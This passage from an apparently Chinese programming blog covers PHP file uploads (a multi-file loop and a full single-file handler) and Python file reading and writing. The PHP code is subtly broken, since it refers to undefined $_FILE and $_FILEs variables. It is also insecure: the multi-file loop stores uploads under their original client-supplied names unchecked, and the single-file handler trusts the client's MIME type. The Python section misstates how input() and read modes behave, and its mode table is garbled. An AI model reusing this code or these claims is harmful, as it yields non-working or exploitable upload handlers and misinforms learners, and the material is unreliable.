<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">var_dump(<span class="variable">$_FILES</span>); <span class="comment">//打印$_FILES查看数组结构 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">输出如下：</span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">1</span>)  </span><br><span class="line">    <span class="string">&#x27;file&#x27;</span> =&gt;  </span><br><span class="line">        <span class="keyword">array</span> (size=<span class="number">5</span>) </span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> =&gt;  </span><br><span class="line">        <span class="keyword">array</span> (size=<span class="number">2</span>) </span><br><span class="line">        <span class="comment">//文件名 </span></span><br><span class="line">        <span class="number">0</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;psu.jpg&#x27;</span> (length=<span class="number">7</span>) </span><br><span class="line">        <span class="number">1</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;qwe.jpg&#x27;</span> (length=<span class="number">7</span>) </span><br><span class="line">    <span class="comment">//文件mime类型 </span></span><br><span class="line">    <span class="string">&#x27;type&#x27;</span> =&gt; <span class="keyword">array</span> (size=<span class="number">2</span>) </span><br><span class="line">            <span class="number">0</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;image/jpeg&#x27;</span> (length=<span class="number">10</span>) </span><br><span class="line">            <span class="number">1</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;image/jpeg&#x27;</span> (length=<span class="number">10</span>) </span><br><span class="line">    <span class="comment">//缓存文件 </span></span><br><span class="line">    <span class="string">&#x27;tmp_name&#x27;</span> =&gt;  </span><br><span class="line">        <span class="keyword">array</span> (size=<span class="number">2</span>) </span><br><span class="line">            <span class="number">0</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;E:\wamp\tmp\phpF6D5.tmp&#x27;</span> (length=<span class="number">23</span>) </span><br><span class="line">            <span class="number">1</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;E:\wamp\tmp\phpF6F5.tmp&#x27;</span> (length=<span class="number">23</span>) </span><br><span class="line">    <span class="comment">//文件错误信息 </span></span><br><span class="line">    <span class="string">&#x27;error&#x27;</span> =&gt;  </span><br><span class="line">        <span class="keyword">array</span> (size=<span class="number">2</span>) </span><br><span class="line">            <span class="number">0</span> =&gt; <span class="keyword">int</span> <span class="number">0</span> </span><br><span class="line">            <span class="number">1</span> =&gt; <span class="keyword">int</span> <span class="number">0</span> </span><br><span class="line">    <span class="comment">//文件大小 </span></span><br><span class="line">    <span class="string">&#x27;size&#x27;</span> =&gt;  </span><br><span class="line">        <span class="keyword">array</span> (size=<span class="number">2</span>) </span><br><span class="line">        <span class="number">0</span> =&gt; <span class="keyword">int</span> <span class="number">225824</span>     </span><br><span class="line">        <span class="number">1</span> =&gt; <span class="keyword">int</span> <span class="number">151651</span></span><br></pre></td></tr></table></figure>


<blockquote>
<ol>
<li>我们可以看到，两个文件被存储在一个数组中，<font color="#FF7F00"><strong>键名和上传单文件是相同</strong></font>。所以，需要我们for()循环，来分别取出两个文件的需要用到的数据。</li>
<li>在$_FILES中同时保存了两个文件的数据，我们需要使用一个简单的循环，来读取单个文件的信息，并将文件移动到我们想要放的位置。</li>
</ol>
</blockquote>
<p>&amp;emsp;</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; count(<span class="variable">$_FILE</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]); <span class="variable">$i</span>++) &#123;  </span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">用is_uploaded_file()函数判断是上传文件 </span></span><br><span class="line"><span class="comment">并且没有出现错 </span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(is_uploaded_file(<span class="variable">$_FILEs</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>][<span class="variable">$i</span>]) &amp;&amp; <span class="variable">$_FILEs</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>][<span class="variable">$i</span>] == <span class="number">0</span>)&#123;     </span><br><span class="line">       <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$_FILEs</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>][<span class="variable">$i</span>],<span class="string">&#x27;upload/&#x27;</span>.<span class="variable">$_FILE</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>][<span class="variable">$i</span>]))&#123;</span><br><span class="line">   <span class="comment">//用move_uploaded_file()函数移动文件到指定的位置并使用文件原名 </span></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;上传成功&quot;</span>; </span><br><span class="line"></span><br><span class="line">       &#125;<span class="keyword">else</span>&#123; </span><br><span class="line"></span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;上传失败&#x27;</span>; </span><br><span class="line"></span><br><span class="line">       &#125; </span><br><span class="line"></span><br><span class="line">   &#125;<span class="keyword">else</span>&#123; </span><br><span class="line"></span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;上传失败&#x27;</span>; </span><br><span class="line"></span><br><span class="line">   &#125; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="五-单文件上传完整代码"><a href="#五-单文件上传完整代码" class="headerlink" title="五. 单文件上传完整代码"></a><font color="#FF6347" face="Comic sans MS">五. 单文件上传完整代码</font></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line"> <span class="keyword">switch</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]) &#123;</span><br><span class="line"> <span class="comment">//错误码不为0，即文件上传过程中出现了错误</span></span><br><span class="line"> <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;文件过大&#x27;</span>;</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;文件超出指定大小&#x27;</span>;</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;只有部分文件被上传&#x27;</span>;</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;文件没有被上传&#x27;</span>;</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> <span class="string">&#x27;6&#x27;</span>:</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;找不到指定文件夹&#x27;</span>;</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">case</span> <span class="string">&#x27;7&#x27;</span>:</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;文件写入失败&#x27;</span>;</span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line"> <span class="keyword">default</span>:</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;上传出错&lt;br/&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$MAX_FILE_SIZE</span> = <span class="number">100000</span>;</span><br><span class="line"> <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &gt; <span class="variable">$MAX_FILE_SIZE</span>) &#123;</span><br><span class="line"> <span class="keyword">exit</span>(<span class="string">&quot;文件超出指定大小&quot;</span>);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$allowSuffix</span> = <span class="keyword">array</span>(</span><br><span class="line"> <span class="string">&#x27;jpg&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;gif&#x27;</span>,</span><br><span class="line"> );</span><br><span class="line"></span><br><span class="line"> <span class="variable">$myImg</span> = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"> <span class="variable">$myImgSuffix</span> = array_pop(<span class="variable">$myImg</span>);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (!in_array(<span class="variable">$myImgSuffix</span>, <span class="variable">$allowSuffix</span>)) &#123;</span><br><span class="line"> <span class="keyword">exit</span>(<span class="string">&quot;文件后缀名不符&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$allowMime</span> = <span class="keyword">array</span>(</span><br><span class="line"> <span class="string">&quot;image/jpg&quot;</span>,</span><br><span class="line"> <span class="string">&quot;image/jpeg&quot;</span>,</span><br><span class="line"> <span class="string">&quot;image/pjpeg&quot;</span>,</span><br><span class="line"> <span class="string">&quot;image/gif&quot;</span>,</span><br><span class="line"> );</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (!in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>], <span class="variable">$allowMime</span>)) &#123;</span><br><span class="line"> <span class="keyword">exit</span>(<span class="string">&#x27;文件格式不正确，请检查&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$path</span> = <span class="string">&quot;upload/images/&quot;</span>;</span><br><span class="line"> <span class="variable">$name</span> = date(<span class="string">&#x27;Y&#x27;</span>) . date(<span class="string">&#x27;m&#x27;</span>) . date(<span class="string">&quot;d&quot;</span>) . date(<span class="string">&#x27;H&#x27;</span>) . date(<span class="string">&#x27;i&#x27;</span>) . date(<span class="string">&#x27;s&#x27;</span>) . rand(<span class="number">0</span>, <span class="number">9</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$myImgSuffix</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (is_uploaded_file(<span class="variable">$_FILEs</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$_FILEs</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$path</span> . <span class="variable">$name</span>)) &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;上传成功&quot;</span>;</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;上传失败&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;不是上传文件&#x27;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-文件系统</title>
    <url>/post/Python-FileContents/</url>
    <content><![CDATA[<p>Python是 文件对象.write()，PHP是fwrite() 😀…</p>
<span id="more"></span>

<br>

<br>

<center><font color="#00B2EE" face="Comic sans MS" size=5>文件系统</font> </center>

<p>推荐参考资料：<br><font color="#00B2EE">《<a href="http://www.runoob.com/python3/python3-inputoutput.html">Python3 输入和输出</a>》</font><br><font color="#00B2EE">《<a href="https://www.cnblogs.com/sjie0224/articles/7562509.html">Python学习之路-11 (文件操作)</a>》</font> </p>
<br>

<br>

<h3 id="一-读写文件"><a href="#一-读写文件" class="headerlink" title="一. 读写文件"></a><font color="#FF6347" face="Comic sans MS">一. 读写文件</font></h3><p>Python提供了 input() 内置函数从标准输入读入一行文本，并将输入以字符串形式返回，默认的标准输入是键盘。</p>
<p>input 可以接收一个Python表达式作为输入，并将运算结果返回。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="built_in">input</span>(<span class="string">&quot;请输入：&quot;</span>);</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;你输入的内容是: &quot;</span>, <span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line">这会产生如下的对应着输入的结果：</span><br><span class="line">请输入：菜鸟教程</span><br><span class="line">你输入的内容是:  菜鸟教程</span><br></pre></td></tr></table></figure>

<br>

<blockquote>
<p><font color="#00B2EE"><strong>使用到的方法：</strong></font></p>
</blockquote>
<ul>
<li><font color="#FF7F00"><strong>open()：</strong></font> 以某种读写模式打开一个文件，将会返回一个 file 对象；</li>
<li><font color="#FF7F00"><strong>f.write(string) ：</strong></font> 将 string 写入到文件中, 然后返回写入的字符数；</li>
<li><font color="#FF7F00"><strong>f.read(size)：</strong></font> 将读取一定数目的数据, 然后作为字符串或字节对象返回；</li>
<li><font color="#FF7F00"><strong>f.readline() ：</strong></font> 从文件读取整行，包括 “\n” 字符。如果指定了一个非负数的参数，则返回指定大小的字节数，包括 “\n” 字符。；</li>
<li><font color="#FF7F00"><strong>f.readlines() ：</strong></font> 将返回该文件中包含的所有行；</li>
<li><font color="#FF7F00"><strong>f.tell() ：</strong></font> 返回文件对象当前所处的位置, 它是从文件开头开始算起的<strong>字节数</strong>；</li>
<li><font color="#FF7F00"><strong>f.seek() ：</strong></font> 如果要改变文件当前的位置, 可以使用 f.seek(offset, from_what) 函数；</li>
<li><font color="#FF7F00"><strong>f.close() ：</strong></font> 当你处理完一个文件后, 调用 f.close() 来关闭文件并释放系统的资源，如果尝试再调用该文件，则会抛出异常。</li>
</ul>
<br>


<br>

<h4 id="1-1-open"><a href="#1-1-open" class="headerlink" title="1.1 open()"></a><font color="#3CB371" face="Comic sans MS">1.1 open()</font></h4><p>Python open() 方法用于打开一个文件，并<font color="#FF7F00"><strong>返回文件对象</strong></font>，在对文件进行处理过程都需要使用到这个函数，如果该文件无法被打开，会抛出 OSError。</p>
<p><strong>注意：</strong>使用 open() 方法一定要保证关闭文件对象，即调用 close() 方法。</p>
<p>open() 函数常用形式是接收两个参数：<strong>文件名(file)和模式(mode)<strong>。即</strong><code>a = open(file, mode); </code></strong></p>
<table>
<thead>
<tr>
<th align="left">语法格式</th>
<th align="left">参数说明</th>
<th align="left">返回类型</th>
</tr>
</thead>
<tbody><tr>
<td align="left">open(file, mode, buffering, encoding&#x3D;None, <br>&amp;emsp;&amp;emsp;&amp;emsp;errors&#x3D;None, newline&#x3D;None, <br>&amp;emsp;&amp;emsp;&amp;emsp;closefd&#x3D;True, opener&#x3D;None)</td>
<td align="left">file: 必需，文件路径（相对或者绝对路径）。<br>mode: 可选，文件打开模式<br>buffering: 设置缓冲<br>encoding: 一般使用utf8<br>errors: 报错级别<br>newline: 区分换行符<br>closefd: 传入的file参数类型<br>opener:</td>
<td align="left">文件对象</td>
</tr>
</tbody></table>
<br>

<p><font color="#FF7F00"><strong>mode 参数有：</strong></font></p>
<table>
<thead>
<tr>
<th align="left">模式</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">t</td>
<td align="left">文本模式 (默认)。</td>
</tr>
<tr>
<td align="left">x</td>
<td align="left">写模式，新建一个文件，如果该文件已存在则会报错。</td>
</tr>
<tr>
<td align="left">b</td>
<td align="left">二进制模式。</td>
</tr>
</tbody></table>
<ul>
<li>|打开一个文件进行<strong>更新(可读可写)<strong>。<br>U    |通用换行模式（不推荐）。<br>r    |以</strong>只读方式</strong>打开文件。文件的指针将会放在<strong>文件的开头</strong>。这是默认模式。<br>rb    |以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。<br>一般用于非文本文件如图片等。<br>r+    |打开一个文件<strong>用于读写</strong>。文件指针将会放在文件的<strong>开头</strong>。<br>rb+    |以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。一般用于非文本文件如图片等。<br>w    |打开一个文件<strong>只用于写入</strong>。如果该文件已存在则打开文件，并从开头开始编辑，即<strong>原有内容会被删除</strong>。<br>如果该文件不存在，创建新文件。<br>wb    |以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有<br>内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。<br>w+    |打开一个文件用于<strong>读写</strong>。如果该文件已存在则打开文件，并<strong>从开头开始编辑</strong>，<strong>即原有内容会被删除</strong>。<br>如果该文件不存在，创建新文件。<br>wb+    |以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，<br>即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。<br>a    |打开一个文件用于<strong>追加(不能读)<strong>。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，<br>新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。<br>ab    |以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，<br>新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。<br>a+    |打开一个文件用于</strong>读写</strong>。如果该文件已存在，文件<strong>指针将会放在文件的结尾</strong>。<br>文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。<br>ab+    |以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。<br>如果该文件不存在，创建新文件用于读写。</li>
</ul>
<br>

<p>下图很好的总结了这几种模式：</p>
<p><img data-src="https://i.loli.net/2019/03/06/5c7fb64577036.png" alt="2.png"></p>
<br>

<table>
<thead>
<tr>
<th align="center">模式</th>
<th align="center">读</th>
<th align="center">写</th>
<th align="center">创建</th>
<th align="center">覆盖</th>
<th align="center">指针在开始</th>
<th align="center">指针在结尾</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>r</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"><strong>✔</strong></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><strong>r+</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"><strong>✔</strong></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><strong>w</strong></td>
<td align="center"></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><strong>w+</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><strong>a</strong></td>
<td align="center"></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"><strong>✔</strong></td>
</tr>
<tr>
<td align="center"><strong>a+</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"><strong>✔</strong></td>
</tr>
</tbody></table>
<p><font color="#FF7F00"><strong>总结：</strong></font></p>
<ol>
<li>w 和 a 都是<font color="#FF7F00"><strong>写入不能读内容</strong></font>，前者是覆盖，后者是追加内容。</li>
<li>w+ 和 a+ 都是<font color="#FF7F00"><strong>写入且能读内容</strong></font>，前者是覆盖，后者是追加内容。</li>
</ol>
<br>

<p>以下实例将字符串写入到文件 foo.txt 中：</p>
<p><font color="#FF7F00"></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开一个文件</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;g:/PythonSt/foo.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>)</span><br><span class="line"><span class="keyword">if</span>(f):</span><br><span class="line">	f.write( <span class="string">&quot;Python 是一个非常好的语言。\n是的，的确非常好!!\n&quot;</span> )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;文件打开失败&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭打开的文件</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">此时打开文件 foo.txt,显示如下：</span><br><span class="line">Python 是一个非常好的语言。</span><br><span class="line">是的，的确非常好!!</span><br></pre></td></tr></table></figure>


<blockquote>
<ol>
<li>第一个参数为要打开的文件名。</li>
<li>第二个参数描述文件如何使用的字符。 mode 可以是 <code>r</code> 如果文件只读, <code>w</code> 只用于写 (如果存在同名文件则将被删除), 和 <code>a</code> 用于追加文件内容; 所写的任何数据都会被自动增加到末尾. <code>r+</code> 同时用于读写。 mode 参数是可选的; <code>r</code> 将是默认值。</li>
</ol>
</blockquote>
<br>


<br>

<h4 id="1-2-f-write"><a href="#1-2-f-write" class="headerlink" title="1.2 f.write()"></a><font color="#3CB371" face="Comic sans MS">1.2 f.write()</font></h4><br>

<table>
<thead>
<tr>
<th align="left">语法格式</th>
<th align="left">参数说明</th>
<th align="left">返回类型</th>
</tr>
</thead>
<tbody><tr>
<td align="left">f.write(string)</td>
<td align="left">将 string 写入到文件中</td>
<td align="left">返回写入的字符数</td>
</tr>
</tbody></table>
<br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开一个文件</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;g:/pythonst/foo.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line">num = f.write( <span class="string">&quot;16845654316532&quot;</span> )</span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line"><span class="comment"># 关闭打开的文件</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">OUTPUT： <span class="number">14</span></span><br></pre></td></tr></table></figure>



<br>


<br>

<h4 id="1-3-f-read"><a href="#1-3-f-read" class="headerlink" title="1.3 f.read()"></a><font color="#3CB371" face="Comic sans MS">1.3 f.read()</font></h4><p>为了读取一个文件的内容，调用 <code>f.read(size)</code>, 这将读取一定数目的数据, 然后作为字符串或字节对象返回。</p>
<p>size 是一个可选的数字类型的参数。 当 size 被忽略了或者为负, 那么该文件的所有内容都将被读取并且返回。</p>
<p><strong>注意：</strong><font color="#FF7F00"><strong><code>f.read(size)</code>必须在<code>r</code>或者<code>r+</code>模式下来读取内容。</strong></font></p>
<table>
<thead>
<tr>
<th align="left">语法格式</th>
<th align="left">参数说明</th>
<th align="left">返回类型</th>
</tr>
</thead>
<tbody><tr>
<td align="left">f.read(size)</td>
<td align="left">文件读取指定的字节数（读取的时候文件内容的<br>一个字符按一个字节来读），如果未给定或为负则读取所有</td>
<td align="left">字符串或字节对象返回</td>
</tr>
</tbody></table>
<br>


<p>以下实例假定文件 foo.txt 已存在（上面实例中已创建）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;foo.txt文件内容为16845654316532&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 打开一个文件</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;g:/PythonSt/foo.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>)  </span><br><span class="line">m = f.read(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(m,<span class="built_in">int</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(m) <span class="keyword">is</span> <span class="built_in">str</span>)</span><br><span class="line"><span class="comment"># 关闭打开的文件</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line"><span class="number">168456</span>      <span class="string">&#x27;&#x27;&#x27;把一个字符当作一个字节读取&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="literal">False</span>       <span class="string">&#x27;&#x27;&#x27;isinstance(变量,类型)判断变量的类型&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="literal">True</span>        <span class="string">&#x27;&#x27;&#x27;type()...is 也可以判断类型&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>


<br>


<br>

<h4 id="1-4-f-close"><a href="#1-4-f-close" class="headerlink" title="1.4 f.close()"></a><font color="#3CB371" face="Comic sans MS">1.4 f.close()</font></h4><p>在文本文件中 (那些打开文件的模式下没有 b 的), 只会相对于文件起始位置进行定位。</p>
<p>当你处理完一个文件后, 调用 f.close() 来关闭文件并释放系统的资源，<font color="#FF7F00"><strong>如果尝试再调用该文件，则会抛出异常</strong></font>。如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开一个文件</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;g:/pythonst/foo.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line">num = f.write( <span class="string">&quot;16845654316532&quot;</span> )</span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line"><span class="comment"># 关闭打开的文件</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f.read())</span><br><span class="line"></span><br><span class="line">OUTPUT： </span><br><span class="line"><span class="number">14</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;3-7.py&quot;</span>, line <span class="number">8</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="built_in">print</span>(f.read())</span><br><span class="line">ValueError: I/O operation on closed file.</span><br></pre></td></tr></table></figure>

<br>

<p>由于文件读写时都有可能产生IOError，一旦出错，后面的f.close()就不会调用。所以，为了保证无论是否出错都能正确地关闭文件，我们可以使用<font color="#FF7F00"><strong><code>try ... finally</code></strong></font>来实现：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;foo.txt内容为16845654316532&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	f = <span class="built_in">open</span>(<span class="string">&quot;g:/PythonSt/foo.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>)  </span><br><span class="line">	m = f.read(<span class="number">6</span>)</span><br><span class="line">	<span class="built_in">print</span>(m)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">OUTPUT： <span class="number">168456</span></span><br></pre></td></tr></table></figure>


<br>

<p>但是每次都这么写实在太繁琐，所以，Python引入了<font color="#FF7F00"><strong><code>with</code>语句搭配<code>as</code></strong></font>来自动帮我们调用close()方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;foo.txt内容为16845654316532&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;g:/PythonSt/foo.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(f.read())</span><br><span class="line"></span><br><span class="line">OUTPUT： </span><br><span class="line"><span class="number">16845654316532</span></span><br></pre></td></tr></table></figure>



<br>


<br>

<h4 id="1-5-f-readline"><a href="#1-5-f-readline" class="headerlink" title="1.5 f.readline()"></a><font color="#3CB371" face="Comic sans MS">1.5 f.readline()</font></h4><br>

<table>
<thead>
<tr>
<th align="left">语法格式</th>
<th align="left">参数说明</th>
<th align="left">返回类型</th>
</tr>
</thead>
<tbody><tr>
<td align="left">fileObject.readline(size)</td>
<td align="left">size为从文件中读取的字节数。<br>从文件读取整行，（包括 “\n” 字符。）</td>
<td align="left">size非负数则返回指定大小的字节数，<br>包括”\n”字符。</td>
</tr>
</tbody></table>
<br>

<p>实例<br>以下实例演示了 readline() 方法的使用：</p>
<p>文件 runoob.txt 的内容如下：</p>
<p><code>www.runoob.com&#39;\n&#39;</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code></p>
